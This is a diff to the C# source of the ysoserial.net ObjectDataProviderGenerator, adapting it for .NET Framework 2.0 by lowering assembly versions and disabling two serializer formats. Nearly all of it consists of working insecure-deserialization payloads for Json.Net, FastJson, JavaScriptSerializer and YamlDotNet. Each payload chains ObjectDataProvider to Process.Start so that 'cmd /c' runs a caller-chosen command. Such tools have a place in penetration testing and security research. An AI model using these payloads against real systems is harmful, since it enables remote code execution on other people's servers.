@@ -14,7 +14,7 @@ using System.Windows.Data;
 using System.Reflection;
 using System.Collections.Specialized;
 
-namespace ysoserial.Generators
+namespace ysoserial_frmv2.Generators
 {
     class ObjectDataProviderGenerator : GenericGenerator
     {
@@ -25,7 +25,9 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0" };
+            // System.Data.Services.Internal.ExpandedWrapper is not available in .NET Framework 2.0
+            // "XmlSerializer" and "DataContractSerializer" have been removed from the following list
+            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "YamlDotNet < 5.0.0" };
         }
 
         public override string Name()
@@ -68,13 +70,13 @@ namespace ysoserial.Generators
             if (formatter.ToLower().Equals("json.net"))
             {
                 String payload = @"{
-    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
     'MethodName':'Start',
     'MethodParameters':{
-        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$type':'System.Collections.ArrayList, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
         '$values':['cmd','/c " + cmd + @"']
     },
-    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }";
                 if (test)
                 {
@@ -95,9 +97,9 @@ namespace ysoserial.Generators
             {
                 String payload = @"{
     ""$types"":{
-        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
-        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
-        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
+        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 3.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
+        ""System.Diagnostics.Process, System, Version = 2.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
+        ""System.Diagnostics.ProcessStartInfo, System, Version = 2.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
     },
     ""$type"":""1"",
     ""ObjectInstance"":{
@@ -126,12 +128,12 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("javascriptserializer"))
             {
                 String payload = @"{
-    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
+    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
     'MethodName':'Start',
     'ObjectInstance':{
-        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '__type':'System.Diagnostics.Process, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
         'StartInfo': {
-            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
             'FileName':'cmd',
             'Arguments':'/c " + cmd + @"'
         }
@@ -150,6 +152,7 @@ namespace ysoserial.Generators
                 }
                 return payload;
             }
+            /*
             else if (formatter.ToLower().Equals("xmlserializer"))
             {
                 String payload = $@"<?xml version=""1.0""?>
@@ -228,15 +231,16 @@ namespace ysoserial.Generators
                 }
                 return payload;
             }
+            */
             else if (formatter.ToLower().Equals("yamldotnet"))
                 {
                 String payload = @"
-!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
+!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=3.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
     MethodName: Start,
 	ObjectInstance: 
-		!<!System.Diagnostics.Process%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+		!<!System.Diagnostics.Process%2c%20System%2c%20Version=2.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
 			StartInfo:
-				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=2.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
 					FileName : cmd,
 					Arguments : '/C " + cmd + @"'
 
